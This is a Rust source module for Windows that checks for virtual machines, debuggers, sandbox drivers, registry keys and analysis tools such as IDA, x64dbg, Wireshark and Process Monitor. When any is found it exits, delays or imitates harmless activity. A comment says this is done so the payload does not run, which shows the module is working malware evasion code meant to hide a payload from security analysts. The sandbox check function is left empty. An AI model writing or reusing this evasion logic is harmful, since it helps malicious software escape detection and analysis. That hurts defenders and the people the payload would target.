#![allow(dead_code)]
use std::path::Path;
use std::time::Duration;

use windows::core::w;
use windows::Win32::Foundation::{BOOL, CloseHandle, MAX_PATH};
use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameW};
use windows::Win32::System::SystemInformation::{
    GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX,
};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
use windows::Win32::UI::WindowsAndMessaging::{
    EnumWindows, GetSystemMetrics, GetWindowTextW, SM_CXSCREEN, SM_CYSCREEN,
};
use crate::core::exit_patcher::safe_exit;

// if detect, it will delay then exit
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EvasionAction {
    ExitSilently,  // exit immediately
    DelayThenExit, // rand wait and exit
    ReportOnly,    // do nothing, just return result
    FakeBehavior,  // do normal behavior (not run payload)
}

pub struct AntiAnalysisConfig {
    pub check_vm: bool,
    pub check_sandbox: bool,
    pub check_debugger: bool,
    pub min_uptime_seconds: u64,
    pub min_ram_gb: u64,
    pub min_processes: usize,
    pub min_disk_gb: u64,
    pub delay_range: (u64, u64),
    pub action: EvasionAction,
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            check_vm: true,
            check_sandbox: true,
            check_debugger: true,
            min_uptime_seconds: 600, // 10 minutes
            min_ram_gb: 2,
            min_processes: 50,
            min_disk_gb: 60,
            delay_range: (30, 120),
            action: EvasionAction::DelayThenExit,
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct DetectionResult {
    pub is_vm: bool,
    pub is_sandbox: bool,
    pub is_debugger: bool,
    pub vm_type: Option<String>,
    pub detected_processes: Vec<String>,
    pub reasons: Vec<String>,
}

impl DetectionResult {
    pub fn is_detected(&self) -> bool {
        self.is_vm || self.is_sandbox || self.is_debugger
    }
}

pub fn run_checks(config: &AntiAnalysisConfig) -> DetectionResult {
    let mut result = DetectionResult::default();

    if config.check_vm {
        check_vm(&mut result);
    }

    if config.check_sandbox {
        check_sandbox(&mut result, config);
    }

    if config.check_debugger {
        check_debugger(&mut result);
    }

    result
}

#[allow(dead_code)]
pub fn run_and_evade(config: &AntiAnalysisConfig) -> bool {
    let result = run_checks(config);

    if result.is_detected() {
        match config.action {
            EvasionAction::ExitSilently => {
                safe_exit(0); // std::process::exit(0);
            }
            EvasionAction::DelayThenExit => {
                random_delay(config.delay_range);
                safe_exit(0); // std::process::exit(0);
            }
            EvasionAction::FakeBehavior => {
                fake_behavior();
                safe_exit(0); // std::process::exit(0);
            }
            EvasionAction::ReportOnly => {
                return true; // detected
            }
        }
    }

    false // not detected
}

pub fn random_delay(range: (u64, u64)) {
    use std::time::{SystemTime, UNIX_EPOCH};

    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64;

    let delay_secs = range.0 + (seed % (range.1 - range.0 + 1));
    std::thread::sleep(Duration::from_secs(delay_secs));
}

// VM Detection
// -----------------------------------

fn check_vm(result: &mut DetectionResult) {
    if check_cpuid_hypervisor() {                // cpuid hypervisor bit 
        result.is_vm = true;
        result.reasons.push("CPUID hypervisor bit set".to_string());
    }

    if let Some(vm_type) = check_vm_files() {    // vm files
        result.is_vm = true;
        result.vm_type = Some(vm_type.clone());
        result.reasons.push(format!("VM files detected: {}", vm_type));
    }

    if let Some(vm_type) = check_vm_registry() { // reg check
        result.is_vm = true;
        result.vm_type = Some(vm_type.clone());
        result.reasons.push(format!("VM registry detected: {}", vm_type));
    }

    let vm_processes = check_vm_processes();     // process check
    if !vm_processes.is_empty() {
        result.is_vm = true;
        result.reasons.push(format!("VM processes: {:?}", vm_processes));
    }
}

fn check_cpuid_hypervisor() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        use std::arch::asm;

        let ecx: u32;
        unsafe {
            asm!(
                "push rbx",
                "mov eax, 1",
                "cpuid",
                "pop rbx",
                out("ecx") ecx,
                out("eax") _,
                out("edx") _,
            );
        }

        // bit 31 = hypervisor present
        (ecx >> 31) & 1 == 1
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

fn check_vm_files() -> Option<String> {
    let vm_files: &[(&str, &str)] = &[
        // VMware
        (r"C:\Windows\System32\drivers\vmhgfs.sys",     "VMware"),
        (r"C:\Windows\System32\drivers\vmmouse.sys",    "VMware"),
        (r"C:\Windows\System32\drivers\vmci.sys",       "VMware"),
        (r"C:\Windows\System32\drivers\vmusbmouse.sys", "VMware"),
        (r"C:\Windows\System32\drivers\vmx_svga.sys",   "VMware"),
        (r"C:\Windows\System32\drivers\vmxnet.sys",     "VMware"),

        // VirtualBox
        (r"C:\Windows\System32\drivers\VBoxMouse.sys",  "VirtualBox"),
        (r"C:\Windows\System32\drivers\VBoxGuest.sys",  "VirtualBox"),
        (r"C:\Windows\System32\drivers\VBoxSF.sys",     "VirtualBox"),
        (r"C:\Windows\System32\drivers\VBoxVideo.sys",  "VirtualBox"),
        (r"C:\Windows\System32\vboxdisp.dll",           "VirtualBox"),
        (r"C:\Windows\System32\vboxhook.dll",           "VirtualBox"),

        // Hyper-V
        (r"C:\Windows\System32\drivers\vmbus.sys",      "Hyper-V"),
        (r"C:\Windows\System32\drivers\VMBusHID.sys",   "Hyper-V"),

        // QEMU
        (r"C:\Windows\System32\qemu-ga.exe",            "QEMU"),
        (r"C:\Program Files\Qemu-ga\qemu-ga.exe",       "QEMU"),
    ];

    for (path, vm_type) in vm_files {
        if Path::new(path).exists() {
            return Some(vm_type.to_string());
        }
    }

    None
}

fn check_vm_registry() -> Option<String> {
    use std::process::Command;
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    let checks: &[(&str, &str)] = &[
        // VMware
        (r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",                  "VMware"),

        // VirtualBox
        (r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",          "VirtualBox"),
        (r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",                           "VirtualBox"),

        // Hyper-V
        (r"HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters", "Hyper-V"),
    ];

    for (key, vm_type) in checks {
        if let Ok(output) = Command::new("reg")
            .args(["query", key])
            .creation_flags(CREATE_NO_WINDOW)
            .output() 
        {
            if output.status.success() {
                return Some(vm_type.to_string());
            }
        }
    }

    None
}

fn check_vm_processes() -> Vec<String> {
    let vm_process_names: &[&str] = &[
        // VMware
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vmacthlp.exe",

        // VirtualBox
        "vboxservice.exe",
        "vboxtray.exe",

        // QEMU
        "qemu-ga.exe",

        // Hyper-V
        "vmicsvc.exe",

        // Parallels
        "prl_tools.exe",
        "prl_cc.exe",
    ];

    let running = get_running_processes();
    let mut found = Vec::new();

    for proc in &running {
        let lower = proc.to_lowercase();
        for vm_proc in vm_process_names {
            if lower == *vm_proc {
                found.push(proc.clone());
            }
        }
    }

    found
}

// Sandbox Detection
// -----------------------------------

fn check_sandbox(result: &mut DetectionResult, _config: &AntiAnalysisConfig) {
    // Minimal sandbox checks - removed aggressive detections
    // that cause false positives on legitimate systems
}

// Debugger Detection
// -----------------------------------

fn check_debugger(result: &mut DetectionResult) {
    if unsafe { IsDebuggerPresent().as_bool() } {
        result.is_debugger = true;
        result.reasons.push("IsDebuggerPresent = true".to_string());
    }

    if check_peb_being_debugged() {
        result.is_debugger = true;
        result.reasons.push("PEB.BeingDebugged = 1".to_string());
    }

    if check_nt_global_flag() {
        result.is_debugger = true;
        result.reasons.push("NtGlobalFlag indicates debugging".to_string());
    }

    let debugger_procs = check_debugger_processes();
    if !debugger_procs.is_empty() {
        result.is_debugger = true;
        result.detected_processes.extend(debugger_procs.clone());
        result.reasons.push(format!("Debugger processes: {:?}", debugger_procs));
    }

    let analysis_windows = check_analysis_windows();
    if !analysis_windows.is_empty() {
        result.is_debugger = true;
        result.reasons.push(format!("Analysis windows: {:?}", analysis_windows));
    }
}

fn check_peb_being_debugged() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        use std::arch::asm;

        let peb_addr: u64;
        let being_debugged: u64;

        unsafe {
            asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb_addr,
            );

            asm!(
                "movzx {}, byte ptr [{} + 0x2]",
                out(reg) being_debugged,
                in(reg) peb_addr,
            );
        }

        being_debugged != 0
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

fn check_nt_global_flag() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        use std::arch::asm;

        let peb_addr: u64;
        let nt_global_flag: u32;

        unsafe {
            asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb_addr,
            );

            asm!(
                "mov {:e}, dword ptr [{} + 0xBC]", // offset 0xBC for x64
                out(reg) nt_global_flag,
                in(reg) peb_addr,
            );
        }

        // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        const DEBUG_FLAGS: u32 = 0x70;

        (nt_global_flag & DEBUG_FLAGS) != 0
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        false
    }
}

fn check_debugger_processes() -> Vec<String> {
    let debugger_names: &[&str] = &[
        // Debuggers
        "ollydbg.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "ida.exe",
        "ida64.exe",
        "idaq.exe",
        "idaq64.exe",
        "idaw.exe",
        "idaw64.exe",
        "windbg.exe",
        "dbgview.exe",
        "radare2.exe",

        // Analysis tools
        "wireshark.exe",
        "fiddler.exe",
        "charles.exe",
        "processhacker.exe",
        "procmon.exe",
        "procmon64.exe",
        "procexp.exe",
        "procexp64.exe",
        "tcpview.exe",
        "autoruns.exe",
        "autorunsc.exe",
        "filemon.exe",
        "regmon.exe",
        
        // Sandboxes
        "vmsrvc.exe",
        "vmusrvc.exe",
        "prl_tools.exe",
        "xenservice.exe",
        "joeboxserver.exe",
        "joeboxcontrol.exe",
        "pstudio.exe",
        "fakenet.exe",
        "dumpcap.exe",
        "httpdebugger.exe",
        "dnspy.exe",
        "de4dot.exe",
        "ilspy.exe",
        "dotpeek.exe",
        "pestudio.exe",
        "resourcehacker.exe",
    ];

    let running = get_running_processes();
    let mut found = Vec::new();

    for proc in &running {
        let lower = proc.to_lowercase();
        for dbg in debugger_names {
            if lower == *dbg {
                found.push(proc.clone());
            }
        }
    }
    found
}

fn check_analysis_windows() -> Vec<String> {
    let window_titles: &[&str] = &[
        "ollydbg",
        "x64dbg",
        "x32dbg",
        "ida",
        "disassembly",
        "debugger",
        "wireshark",
        "fiddler",
        "charles",
        "process monitor",
        "process explorer",
        "process hacker",
        "http debugger",
        "windbg",
        "api monitor",
        "tcpview",
        "regshot",
        "dnspy",
        "ilspy",
        "dotpeek",
    ];

    let mut found = Vec::new();

    unsafe {
        static mut WINDOW_TITLES: Vec<String> = Vec::new();
        WINDOW_TITLES.clear();

        extern "system" fn enum_callback(
            hwnd: windows::Win32::Foundation::HWND,
            _: windows::Win32::Foundation::LPARAM,
        ) -> BOOL {
            let mut title = [0u16; 512];
            let len = unsafe { GetWindowTextW(hwnd, &mut title) };

            if len > 0 {
                let title_str = String::from_utf16_lossy(&title[..len as usize]);
                unsafe { WINDOW_TITLES.push(title_str) };
            }

            BOOL(1) // Continue enumeration
        }

        let _ = EnumWindows(Some(enum_callback), windows::Win32::Foundation::LPARAM(0));

        for title in &WINDOW_TITLES {
            let lower = title.to_lowercase();
            for check in window_titles {
                if lower.contains(check) {
                    found.push(title.clone());
                    break;
                }
            }
        }
    }

    found
}

fn get_running_processes() -> Vec<String> {
    let mut processes = Vec::new();

    unsafe {
        let mut pids = [0u32; 1024];
        let mut bytes_returned = 0u32;

        if EnumProcesses(
            pids.as_mut_ptr(),
            (pids.len() * std::mem::size_of::<u32>()) as u32,
            &mut bytes_returned,
        )
        .is_err()
        { return processes; }

        let count = (bytes_returned as usize) / std::mem::size_of::<u32>();

        for &pid in &pids[..count] {
            if pid == 0 {
                continue;
            }

            if let Ok(handle) = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid)
            {
                let mut name = [0u16; MAX_PATH as usize];
                let len = GetModuleBaseNameW(handle, None, &mut name);

                if len > 0 {
                    let name_str = String::from_utf16_lossy(&name[..len as usize]);
                    processes.push(name_str);
                }

                let _ = CloseHandle(handle);
            }
        }
    }

    processes
}

fn fake_behavior() {
    random_delay((5, 15));
    let _ = std::fs::read_to_string("C:\\Windows\\System32\\config.nt");
    random_delay((2, 5));
}
